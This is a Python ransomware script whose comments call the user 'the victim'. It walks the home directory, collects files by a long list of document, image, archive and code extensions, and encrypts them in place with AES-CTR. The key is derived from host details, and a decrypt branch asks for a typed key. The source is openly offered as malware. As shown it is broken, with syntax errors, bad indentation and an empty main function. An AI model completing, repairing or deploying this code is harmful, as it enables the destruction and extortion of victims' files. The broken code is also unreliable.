# _*_ coding: utf _*_

import os
import socket
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES

# Obtain dirs of the victim
home = os.environ['HOME']
dirs = os.listdir(home)
dirs = [x for x in dirs if not x.startswith('.')]

valid_extensions = [".pl",".7z",".rar",".m4a",".wma",".avi",".wmv",".d3dbsp",".sc2save",".sie",".sum",".bkp",".flv",".js",".raw",".jpeg",".tar",".zip",".tar.gz",".cmd",".key",".DOT",".docm",".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".bmp", ".mp4", ".mp3"]


def checkInternet():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('socket.io', 80))
        print("Connected")
        s.close()
    except:
        exit()

def getHash():
    hashComputer = os.environ['HOME'] + os.environ['USER'] + socket.gethostname() + str(random.randint(0, 1000000000000000000000000000000000))
    hashComputer = hashlib.sha512(hashComputer.encode('utf-8'))
    hashComputer = hashComputer.hexdigest()

    # Cut Hash to 32

    newKey = []
    for key in hashComputer:
        if len(newKey) == 32:
            hashComputer = ''.join(newKey) # Convert list into str
            break
        else:
            newKey.append(key)
    return hashComputer

def encryptADecrypt(file, crypto, blockSize = 16):
    with open(file, 'r+b') as encryptedFile:
        decryptedContent = encryptedFile.read(blockSize)
        while decryptedContent:
            encryptedContent = crypto(decryptedContent)
            if len(decryptedContent) != len(encryptedContent):
                raise ValueError('')
            encryptedFile.seek(- len(decryptedContent), 1)
            encryptedFile.write(encryptedContent)
            decryptedContent = encryptedFile.read(blockSize)


def discover(key):
    file_list = open('file_list', 'w+')
    for dir in dirs:
        path = home+'/'+dir
        #print(path)
        for valid_extension in valid_extensions:
            for absolutePath, directory, files in os.walk(path):
                for file in files:
                    if file.endswith(valid_extension):
                        file_list.write(os.path.join(absolutePath, file) + '\n')
    file_list.close(0)

    list = open('file_list', 'r')
    list = list.read().split('\n')
    list = [l for in list if not l == ""]

    # keyFile = open('keyFile', 'w+')
    # keyFile.write(key)

    if os.path.exists('keyFile'):
        key1 = raw_input('Key: ')
            keyFile = open('keyFile', 'r')
            keyFile.write(key)
            key = keyFile.read().split('\n')
            key = ''.join(key)

            if key1 == key:
                c = Counter.new(128)
                crypto = AES.new(key, AES.MODE_CTR, counter = c)
                decryptFiles = crypto.decrypt

                for element in list:
                    encryptADecrypt(element, decryptFiles)


    else:
        c = Counter.new(128)
        crypto = AES.new(key, AES.MODE_CTR, counter = c)
        keyFile = open('keyFile', 'w+')
        keyFile.write(key)
        keyFile.close()
        cryptFiles = crypto.encrypt

        for element in list:
            encryptADecrypt(element, cryptFiles)


def main():
    #checkInternet()
    #discover(hashComputer)
    #getHash()



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
